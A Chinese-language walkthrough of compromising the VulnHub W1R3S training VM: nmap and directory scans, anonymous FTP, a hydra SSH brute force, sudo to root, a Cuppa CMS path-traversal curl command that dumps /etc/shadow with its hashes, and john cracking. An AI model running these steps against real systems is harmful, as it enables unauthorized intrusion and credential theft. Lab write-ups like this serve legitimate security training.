# W1R3S 主机渗透实现

-   靶机地址：https://www.vulnhub.com/entry/w1r3s-101,220/
-   下载地址：https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip

## 信息收集：

### 主机发现

```shell
# 设置目标机网段：192.168.8.1
└─$ nmap -sn 192.168.8.1/24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 11:44 HKT
Nmap scan report for 192.168.8.1
Host is up (0.00060s latency).
Nmap scan report for 192.168.8.2
Host is up (0.00051s latency).
Nmap scan report for 192.168.8.128
Host is up (0.00016s latency).
Nmap scan report for 192.168.8.129
Host is up (0.023s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.77 seconds

```

参数讲解：

-   `-sn` 使用ping进行扫描，不进行端口扫描，减少被目标机发现的风险

### 端口扫描

```shell
# 扫描TCP开放端口
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.8.129 -oA /sT                                   
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 11:46 HKT
Nmap scan report for 192.168.8.129
Host is up (0.0014s latency).
Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 00:0C:29:66:14:99 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 12.46 seconds

# 扫描UDP开放端口
└─$ sudo nmap -sU --min-rate 10000 -p- 192.168.8.129 -oA /sU                                   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 11:47 HKT
Nmap scan report for 192.168.8.129
Host is up (0.00032s latency).
Not shown: 65534 open|filtered udp ports (no-response)
PORT     STATE  SERVICE
3306/udp closed mysql
MAC Address: 00:0C:29:66:14:99 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.44 seconds
```

参数讲解：

1.   `-sT` 使用TCP扫描
2.   `--min-rate 10000` 使用10000的速率来进行扫描，相对平衡
3.   `-p-` 扫描全端口
4.   `-sU` 使用UDP扫描
5.   `-oA`  将当前扫描出的内容保存到指定文件中

### 服务扫描系统探测

```shell
└─$ sudo nmap -sC -sV -O -p21,22,80,3389 --min-rate 10000 192.168.8.129 -oA /sC                
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 11:48 HKT
Nmap scan report for 192.168.8.129
Host is up (0.00053s latency).

PORT     STATE    SERVICE       VERSION
21/tcp   open     ftp           vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.8.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open     ssh           OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 07e35a5cc81865b05f6ef775c77e11e0 (RSA)
|   256 03ab9aed0c9b32264413adb0b096c31e (ECDSA)
|_  256 3d6dd24b46e8c9a349e09356222ee354 (ED25519)
80/tcp   open     http          Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
3389/tcp filtered ms-wbt-server
MAC Address: 00:0C:29:66:14:99 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1
OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9, Linux 5.1
Network Distance: 1 hop
Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.50 seconds
```

-   此处发现可以使用匿名账户进行登陆。

参数讲解：

1.   `-sV` 探测当前的服务版本
2.   `-sC` 调用默认的脚本进行漏洞探测
3.   `-O` 探测目标操作系统版本
4.   `-p `  指定端口进行扫描

### 默认脚本漏洞探测

```shell
# 调用默认脚本进行服务漏洞探测
└─$ sudo nmap --script=vuln -p21,22,80,3306 192.168.8.129 -oA /script-scan 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 11:54 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.8.129
Host is up (0.00045s latency).

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|_  /wordpress/wp-login.php: Wordpress login page.
3306/tcp open  mysql
MAC Address: 00:0C:29:66:14:99 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 345.58 seconds
```

参数讲解：
	`--script-vuln`是Nmap调用的一个漏洞扫描脚本集合，用于检测已知漏洞。以下是其中一些脚本的简要介绍：

1. `http-vuln-*`：用于检测Web应用程序中已知的漏洞，包括SQL注入、文件包含、远程命令执行等。

2. `ssl-*`：用于检测SSL和TLS协议中的漏洞，包括心脏滴血漏洞、POODLE漏洞、BEAST漏洞等。

3. `smb-vuln-*`：用于检测Windows SMB协议中的漏洞，包括EternalBlue漏洞、MS17-010漏洞等。

4. `smtp-vuln-*`：用于检测SMTP协议中的漏洞，包括OpenSMTPD漏洞、Exim漏洞等。

5. `dns-*`：用于检测DNS协议中的漏洞，包括DNS隧道、DNS缓存投毒等。

6. `ssh-*`：用于检测SSH协议中的漏洞，包括SSH漏洞、SSH弱口令等。

7. `ftp-*`：用于检测FTP协议中的漏洞，包括ProFTPD漏洞、VSFTPD漏洞等。

这些脚本的使用方法类似于普通的Nmap扫描，只需在命令中加入`--script vuln`参数即可调用。例如：

nmap -sV --script vuln <target>

这将对目标进行端口扫描，并调用`--script=vuln`中的所有漏洞扫描脚本进行检测。需要注意的是，漏洞扫描脚本可能会产生误报或漏报，因此在实际应用中应该结合其他漏洞扫描工具和手动渗透测试进行综合评估。

### web扫描---目录扫描

-   访问默认页

![image-20230514115913861](https://raw.githubusercontent.com/r0o983/images/main/image-20230514115913861.png)

-   手工查找可能存在的文件

![image-20230514121352631](https://raw.githubusercontent.com/r0o983/images/main/image-20230514121352631.png)

-   调用`gobuster`进行扫描

```shell
# 调用字典进行扫描
└─$ sudo gobuster dir -u http://192.168.8.129 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt    
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.8.129
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/14 12:02:28 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 318] [--> http://192.168.8.129/wordpress/]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.8.129/javascript/]
/administrator        (Status: 301) [Size: 322] [--> http://192.168.8.129/administrator/]
/server-status        (Status: 403) [Size: 278]
Progress: 219922 / 220561 (99.71%)
===============================================================
2023/05/14 12:02:54 Finished
===============================================================

# 指定文件格式进行扫描
└─$ sudo gobuster dir -u http://192.168.8.129 -x html,asp,jsp,php,txt,tar -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.8.129
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              tar,html,asp,jsp,php,txt
[+] Timeout:                 10s
===============================================================
2023/05/14 12:04:41 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 11321]
/wordpress            (Status: 301) [Size: 318] [--> http://192.168.8.129/wordpress/]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.8.129/javascript/]
/administrator        (Status: 301) [Size: 322] [--> http://192.168.8.129/administrator/]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 1541113 / 1543927 (99.82%)
===============================================================
2023/05/14 12:07:37 Finished
===============================================================

```

参数讲解：

1.   `dir` 指定是以查找文件(文件夹)的形式进行扫描
2.   `-u`  指定需要扫描的目标
3.   `-w`  指定需要使用的字典文件进行目录扫描

-   调用`feroxbuster`进行扫描

```shell
└─$ sudo feroxbuster -u http://192.168.8.129 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -s 301,200

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.8.129
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [301, 200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      375l      968w    11321c http://192.168.8.129/
301      GET        9l       28w      322c http://192.168.8.129/administrator => http://192.168.8.129/administrator/
301      GET        9l       28w      319c http://192.168.8.129/javascript => http://192.168.8.129/javascript/
301      GET        9l       28w      331c http://192.168.8.129/administrator/language => http://192.168.8.129/administrator/language/
301      GET        9l       28w      328c http://192.168.8.129/administrator/media => http://192.168.8.129/administrator/media/
301      GET        9l       28w      335c http://192.168.8.129/administrator/installation => http://192.168.8.129/administrator/installation/
301      GET        9l       28w      325c http://192.168.8.129/administrator/js => http://192.168.8.129/administrator/js/
301      GET        9l       28w      332c http://192.168.8.129/administrator/templates => http://192.168.8.129/administrator/templates/
301      GET        9l       28w      333c http://192.168.8.129/administrator/components => http://192.168.8.129/administrator/components/
301      GET        9l       28w      326c http://192.168.8.129/administrator/api => http://192.168.8.129/administrator/api/
301      GET        9l       28w      330c http://192.168.8.129/administrator/classes => http://192.168.8.129/administrator/classes/
301      GET        9l       28w      339c http://192.168.8.129/administrator/components/stats => http://192.168.8.129/administrator/components/stats/
301      GET        9l       28w      340c http://192.168.8.129/administrator/installation/html => http://192.168.8.129/administrator/installation/html/
[>-------------------] - 0s      1822/390000  1m      found:13      errors:0      
[>-------------------] - 0s      1822/390000  1m      found:13      errors:0      
301      GET        9l       28w      335c http://192.168.8.129/administrator/classes/ajax => http://192.168.8.129/administrator/classes/ajax/

```

参数讲解：

1.   `-u` 指定需要扫描的目标地址
2.   `-w` 指定字典进行扫描
3.   `-s` 指定特定返回响应吗页面



**以上web扫描以及实际查看web页面均为发现有效可利用信息**

### 匿名登陆ftp服务器

通过匿名账户登陆`ftp`端口进行信息收集：

![image-20230516200246902](https://raw.githubusercontent.com/r0o983/images/main/image-20230516200246902.png)

-   下载文件并查看内容 		下载多个文件：`mget`	下载单个文件：`get`

![image-20230516200700504](https://raw.githubusercontent.com/r0o983/images/main/image-20230516200700504.png)

-   文件中疑似有可以解密的密文，尝试解密：

    ![image-20230516201110988](https://raw.githubusercontent.com/r0o983/images/main/image-20230516201110988.png)

    -   另外一段代码使用`base64`进行编码，使用`base64`进行解密

        ```shell
        # 收获到了一点嘲讽，哈哈哈～
        └─$ echo 'SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==' | base64 -d
        It is easy, but not that easy.. 
        ```

    -   尝试翻转`ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡ ....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ` 字符

        >   ​       ı don't thınk thıs ıs the way to root!
        >
        >    we have a ןot of work to do‘ stop pןayıng around˙˙˙˙

    

## 暴力破解

-   解法1:使用`hydra`来进行暴力破解
    -   尝试对22端口进行暴力破解

```shell
└─$ hydra -l w1r3s -P /usr/share/wordlists/rockyou.txt ssh://192.168.8.129 -t 4
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-16 19:27:39
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://192.168.8.129:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:29h, 4 active
[22][ssh] host: 192.168.8.129   login: w1r3s   password: computer
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-16 19:30:32

# 得到w1r3s密码：computer

```

	- 使用获得的密码进行登陆测试

```shell
└─$ ssh w1r3s@192.168.8.129                                                                                                     
----------------------
Think this is the way?
----------------------
Well,........possibly.
----------------------
w1r3s@192.168.8.129's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

641 packages can be updated.
490 updates are security updates.

New release '18.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

.....You made it huh?....
Last login: Sat May 13 20:23:02 2023 from 192.168.8.128
w1r3s@W1R3S:~$ uname -a
Linux W1R3S 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
w1r3s@W1R3S:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.3 LTS
Release:        16.04
Codename:       xenial
w1r3s@W1R3S:~$ sudo -l
sudo: unable to resolve host W1R3S
[sudo] password for w1r3s:                                                                                                              
Matching Defaults entries for w1r3s on W1R3S:                                                                                           
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                   
                                                                                                                                        
User w1r3s may run the following commands on W1R3S:                                                                                     
    (ALL : ALL) ALL                                                                                                                     
w1r3s@W1R3S:~$ sudo /bin/bash
sudo: unable to resolve host W1R3S                                                                                                      
root@W1R3S:~# whoami
root                                                                                                                                    
root@W1R3S:~# ip a                                                                                                                      
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000                                             
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                                                               
    inet 127.0.0.1/8 scope host lo                                                                                                      
       valid_lft forever preferred_lft forever                                                                                          
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:66:14:99 brd ff:ff:ff:ff:ff:ff
    inet 192.168.8.129/24 brd 192.168.8.255 scope global dynamic ens33
       valid_lft 1046sec preferred_lft 1046sec
    inet6 fe80::98b5:2e62:8533:599e/64 scope link 
       valid_lft forever preferred_lft forever
root@W1R3S:~# 
```

**成功获取root权限的shell** 



`hydra`参数解释：

```shell
语法：Hydra 参数 IP 服务
参数：
-l login 小写，指定用户名进行破解
-L file 大写，指定用户的用户名字典
-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。
-P file 大写，用于指定密码字典。
-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探
-M file 指定目标ip列表文件，批量破解。
-o file 指定结果输出文件
-f 找到第一对登录名或者密码的时候中止破解。
-t tasks 同时运行的线程数，默认是16
-w time 设置最大超时时间，单位
-v / -V 显示详细过程
-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）
-x 自定义密码。
```



## 文件包含漏洞

-   已知使用的系统的cms为`Cuppa`

![image-20230516205202141](/Users/christopher/Library/Application Support/typora-user-images/image-20230516205202141.png)

-   下载文件到本地进行查看

![image-20230516205411127](https://raw.githubusercontent.com/r0o983/images/main/image-20230516205411127.png)

-   文件利用

```shell
└─$ curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.8.129/administrator/alerts/alertConfigField.php            
<style>
    ...........
</style>
<script>
        .............
</script>
<div class="alert_config_field" id="alert">
    <div class="alert_config_top">
        <strong>Configuration</strong>:         <div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"></div>
    </div>
    <div id="content_alert_config" class="content_alert_config">
        root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
sys:*:17379:0:99999:7:::
sync:*:17379:0:99999:7:::
games:*:17379:0:99999:7:::
man:*:17379:0:99999:7:::
lp:*:17379:0:99999:7:::
mail:*:17379:0:99999:7:::
news:*:17379:0:99999:7:::
uucp:*:17379:0:99999:7:::
proxy:*:17379:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
backup:*:17379:0:99999:7:::
list:*:17379:0:99999:7:::
irc:*:17379:0:99999:7:::
gnats:*:17379:0:99999:7:::
nobody:*:17379:0:99999:7:::
systemd-timesync:*:17379:0:99999:7:::
systemd-network:*:17379:0:99999:7:::
systemd-resolve:*:17379:0:99999:7:::
systemd-bus-proxy:*:17379:0:99999:7:::
syslog:*:17379:0:99999:7:::
_apt:*:17379:0:99999:7:::
messagebus:*:17379:0:99999:7:::
uuidd:*:17379:0:99999:7:::
lightdm:*:17379:0:99999:7:::
whoopsie:*:17379:0:99999:7:::
avahi-autoipd:*:17379:0:99999:7:::
avahi:*:17379:0:99999:7:::
dnsmasq:*:17379:0:99999:7:::
colord:*:17379:0:99999:7:::
speech-dispatcher:!:17379:0:99999:7:::
hplip:*:17379:0:99999:7:::
kernoops:*:17379:0:99999:7:::
pulse:*:17379:0:99999:7:::
rtkit:*:17379:0:99999:7:::
saned:*:17379:0:99999:7:::
usbmux:*:17379:0:99999:7:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
sshd:*:17554:0:99999:7:::
ftp:*:17554:0:99999:7:::
mysql:!:17554:0:99999:7:::
    </div>
</div>                                                                                                                               

```

-   看来之前从ftp文件中获取的用户名都是诱导～ 真实用户只有`root`和`w1r3s`
-   将文件内容写入到hash文件中

## 密码破解

-   使用john来进行爆破枚举

    ```shell
    john --wordlist=/usr/share/wordlists/rockyou.txt hash 
    ```

-   获得密码后登陆即可！



Note:

-   [字符串反转](https://www.upsidedowntext.com/)
-   [文本反转，字符串反转](http://tool.huixiang360.com/str/reverse.php)
-   [--data-urlencode][https://everything.curl.dev/http/post/url-encode]
-   [hydra暴力破解][https://zhuanlan.zhihu.com/p/397779150]
